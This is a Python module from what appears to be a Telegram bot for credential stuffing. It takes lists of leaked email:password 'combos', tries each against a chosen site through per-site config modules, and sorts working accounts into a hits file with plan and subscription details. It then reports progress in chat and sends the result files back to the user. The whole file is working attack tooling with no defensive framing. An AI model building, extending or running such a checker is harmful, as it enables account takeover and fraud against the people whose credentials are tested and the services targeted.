import os
from importlib import import_module
from pathlib import Path
import shutil
import psutil
from bot.helper.database import add_task, fetch_one, update_one, delete_one
from bot.helper.message import Editmessage, send_file
from bot.helper.util import Bad, Expired, Free, Hit, parse_text
from telegram import InlineKeyboardButton, InlineKeyboardMarkup

def chunk(lst, n):
    for i in range(0, len(lst), n):
        yield lst[i:i + n]

def make_keyboard():
    path = 'bot/configs/'
    files = [os.path.splitext(filename)[0] for filename in os.listdir(path)]
    keyboard = chunk([InlineKeyboardButton(name, callback_data=name) for name in files], 2)
    return InlineKeyboardMarkup(list(keyboard))

def main_checker(chat, msg, context, site, combo = None, file = None):
    if file:
        with open(combo, 'r') as f:
            combo = f.read()
    combos = parse_text(combo)
    pid = add_task(site, chat, msg, len(combos))
    context.job_queue.run_repeating(handle_job, 5, context=pid, name=f"job_{pid}")
    mod = import_module(f'bot.configs.{site}').Interface()
    store_path = setup_storage(pid)
    for acc in  combos:
        email, paswd = acc.split(':')
        result = mod.check(email, paswd)
        write_result(acc, result, pid, store_path)
    context.job_queue.get_jobs_by_name(f"job_{pid}")[0].schedule_removal()
    Editmessage(chat, '<i>Completed checking the combos...sending files</i>', msg)
    send_storage(chat, msg, store_path)
    Editmessage(chat, '<i>cleaning up....</i>', msg)
    shutil.rmtree(store_path, ignore_errors=True)
    delete_one(pid)
    Editmessage(chat, '<i>Done</i>', msg)
    

def handle_job(context):
    pid = context.job.context
    task = fetch_one(pid)
    text = '<b>Checking the combo</b>\n'
    text += f'\n<b>Site: </b><i>{task[3]}</i>'
    text += f'\n<b>Checked: </b><i>{task[5]}/{task[4]}</i>'
    text += f'\n<b>Bad: </b><i>{task[6]}</i>'
    text += f'\n<b>Free: </b><i>{task[7]}</i>'
    text += f'\n<b>Exipred: </b><i>{task[8]}</i>'
    text += f'\n<b>Hits: </b><i>{task[9]}</i>'
    text += system_info()
    Editmessage(task[1], text, task[2])
    return

def setup_storage(pid):
    Path(f"storage/{pid}/").mkdir()
    open(f"storage/{pid}/hit.txt", 'w').close()
    open(f"storage/{pid}/free.txt", 'w').close()
    open(f"storage/{pid}/bad.txt", 'w').close()
    return f"storage/{pid}/"

def write_result(account, result, pid, path):
    if isinstance(result, Bad):
        update_one(pid, 'bad')
        with open(f"storage/{pid}/bad.txt", 'a') as f:
            f.write(f"combo: {account}\n")
            f.write(f"status: {result.status}\n")
            f.write(f"code: {result.code}\n")
            f.write(f"message: {result.message}\n")
            f.write(f"{'=' * 10}\n")
    elif isinstance(result, Free):
        update_one(pid, 'free')
        with open(f"storage/{pid}/free.txt", 'a') as f:
            f.write(f"combo: {account}\n")
            f.write(f"status: {result.status}\n")
            f.write(f"message: {result.message}\n")
            f.write(f"{'=' * 10}\n")
    elif isinstance(result, Expired):
        update_one(pid, 'expired')
        with open(f"storage/{pid}/free.txt", 'a') as f:
            f.write(f"combo: {account}\n")
            f.write(f"status: {result.status}\n")
            f.write(f"message: {result.message}\n")
            f.write(f"{'=' * 10}\n")
    else:
        update_one(pid, 'hits')
        with open(f"storage/{pid}/hit.txt", 'a') as f:
            f.write(f"combo: {account}\n")
            f.write(f"status: {result.status}\n")
            f.write(f"plan: {result.plan}\n")
            f.write(f"type: {result.type}\n")
            f.write(f"recurring: {result.recur}\n")
            f.write(f"left: {result.left}\n")
            f.write(f"{'=' * 10}\n")
    
def system_info():
    cpu_usage = psutil.cpu_percent(interval=1)
    disk_usage =  psutil.disk_usage('/').percent
    ram_usage = psutil.virtual_memory().percent
    return f"\n\nCPU: {cpu_usage}% DISK: {disk_usage}% RAM: {ram_usage}%"

def send_storage(chat, msg, path):
    for file in os.listdir(path):
        send_file(chat, msg, os.path.join(path, file))
    return